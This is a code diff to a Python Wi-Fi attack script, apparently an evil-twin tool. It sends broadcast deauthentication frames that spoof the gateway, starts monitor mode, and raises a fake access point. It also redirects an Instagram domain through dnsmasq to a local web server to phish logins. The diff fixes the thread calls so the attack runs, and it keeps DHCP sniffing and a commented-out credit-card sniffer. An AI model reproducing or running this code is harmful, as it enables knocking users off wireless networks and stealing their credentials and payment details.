@@ -1,5 +1,4 @@
 from _thread import start_new_thread
-from colorama import init, Fore
 from scapy.all import *
 from prettytable import PrettyTable
 from scapy.layers.dhcp import DHCP
@@ -30,6 +29,7 @@ def choose_ssid():
 
 
 def deauth_attack(gateway_mac, interface):
+    print("hello" + gateway_mac)
     target_mac = "ff:ff:ff:ff:ff:ff"
     packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac,
                                 addr3=gateway_mac) / Dot11Deauth(reason=7)
@@ -64,10 +64,10 @@ def start_monitor_airmon(interfaceName):
     os.system(f'sudo airmon-ng start {interfaceName}')
 
 
-def change_host_file(url):
+def change_host_file():
     apacheIP = ni.ifaddresses('wlp2s0')[ni.AF_INET][0]['addr']  # the physics address of wlp2s0
     nameOfHostsFile = 'dnsmasq.hosts'
-    text = apacheIP + ' ' + 'www.instagram.com'
+    text = apacheIP + ' ' + 'www.instagram1.com'
     write_file(nameOfHostsFile, text)
 
 
@@ -95,7 +95,7 @@ def dnsmasq_service(interface):
     # add routing table
     os.system(f'route add -net 192.168.1.0 netmask {netmask} gw {apIP}')
     # start dnsmasq with the config file
-    os.system('dnsmasq -C {nameConfFile} -d')
+    os.system(f'dnsmasq -C {nameConfFile} -d')
 
 
 def fowardTraffic():
@@ -146,10 +146,11 @@ if __name__ == '__main__':
     ssid = choose_ssid()
     start_monitor_airmon(interfaceName)
     print("Start Deauthentication attack on " + ssid)
-    start_new_thread(deauth_attack, (aps_dict[ssid][0]), interfaceName)
-    start_new_thread(create_fake_ap, (ssid, interfaceName))
+    interfaceName = "wlan0mon"
+    start_new_thread(deauth_attack, ((aps_dict[ssid][0]), interfaceName,))
+    start_new_thread(create_fake_ap, (ssid, interfaceName,))
     start_new_thread(fowardTraffic, ())
     start_new_thread(dnsmasq_service, (interfaceName,))
     time.sleep(10)
-    start_new_thread(sniffDHCP, (interfaceName))
-    # #sniffCreditCard(interfaceName)
+    start_new_thread(sniffDHCP, (interfaceName,))
+    #sniffCreditCard(interfaceName)
